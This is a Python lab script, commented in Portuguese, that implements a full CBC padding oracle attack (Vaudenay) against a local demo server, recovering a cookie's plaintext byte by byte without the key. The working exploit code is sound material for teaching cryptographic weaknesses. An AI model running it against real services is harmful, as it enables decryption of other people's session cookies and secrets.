"""ataque: padding oracle em cbc (classico vaudenay)

# em cbc, plaintext[i] = decrypt(ciphertext[i]) XOR ciphertext[i-1]
# (ou XOR iv, no primeiro bloco). o atacante nao tem a chave, mas pode
# forjar um bloco "anterior" qualquer e perguntar ao oracle se o padding
# resultante e valido. manipulando byte a byte o bloco forjado, ele
# consegue descobrir decrypt(ciphertext[i]) byte a byte e, com isso,
# o plaintext inteiro -- sem nunca conhecer a chave
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from server import emitir_cookie, padding_e_valido  # noqa: E402

BLOCK_SIZE = 16


def dividir_em_blocos(dados: bytes):
    return [
        dados[inicio:inicio + BLOCK_SIZE]
        for inicio in range(0, len(dados), BLOCK_SIZE)
    ]


def decriptar_bloco(bloco_anterior: bytes, bloco_alvo: bytes) -> bytes:
    """recupera os 16 bytes de plaintext de um unico bloco

    bloco_anterior e o bloco (real) que vem antes de bloco_alvo no
    ciphertext original (ou o iv, se bloco_alvo for o primeiro bloco) --
    usado soh para o calculo final do xor; o ataque em si usa um bloco
    forjado proprio para falar com o oracle
    """
    intermediario = bytearray(BLOCK_SIZE)  # decrypt(bloco_alvo), sem xor
    forjado = bytearray(BLOCK_SIZE)

    # descobre um byte por vez, do ultimo para o primeiro do bloco
    for pos in range(BLOCK_SIZE - 1, -1, -1):
        padding_desejado = BLOCK_SIZE - pos

        # ajusta os bytes ja descobertos do bloco forjado para o padding
        # do passo atual (ex: se padding_desejado=3, bytes finais viram 0x03)
        for pos_ajustada in range(pos + 1, BLOCK_SIZE):
            forjado[pos_ajustada] = intermediario[pos_ajustada] ^ padding_desejado

        encontrado = False
        for candidato in range(256):
            forjado[pos] = candidato
            cookie_forjado = bytes(forjado) + bloco_alvo
            if padding_e_valido(cookie_forjado):
                # caso especial: no ultimo byte, um candidato=0x02 "por
                # acaso" pode criar um padding 0x02 0x02 valido mesmo sem
                # ser o byte certo -- confirma alterando o penultimo byte
                if pos == BLOCK_SIZE - 1:
                    forjado[pos - 1] ^= 0xFF
                    cookie_forjado = bytes(forjado) + bloco_alvo
                    ainda_valido = padding_e_valido(cookie_forjado)
                    forjado[pos - 1] ^= 0xFF
                    if not ainda_valido:
                        continue  # era falso positivo, continua testando
                intermediario[pos] = candidato ^ padding_desejado
                encontrado = True
                break

        if not encontrado:
            raise RuntimeError(f"nao achou byte valido na posicao {pos}")

    # plaintext real = intermediario XOR bloco_anterior (real)
    return bytes(
        byte_intermediario ^ byte_bloco_anterior
        for byte_intermediario, byte_bloco_anterior in zip(intermediario, bloco_anterior)
    )


def atacar(cookie: bytes) -> bytes:
    blocos = dividir_em_blocos(cookie)  # blocos[0] e o iv
    plaintext = b""
    for indice_bloco in range(1, len(blocos)):
        plaintext += decriptar_bloco(blocos[indice_bloco - 1], blocos[indice_bloco])
    return plaintext


if __name__ == "__main__":
    cookie = emitir_cookie()
    print("[*] cookie interceptado (hex):", cookie.hex())

    print("[*] executando padding oracle attack (so com valido/invalido)...")
    plaintext_com_padding = atacar(cookie)

    pad_len = plaintext_com_padding[-1]
    plaintext = plaintext_com_padding[:-pad_len]

    print(f"[+] plaintext recuperado sem conhecer a chave:")
    print(plaintext.decode(errors="replace"))
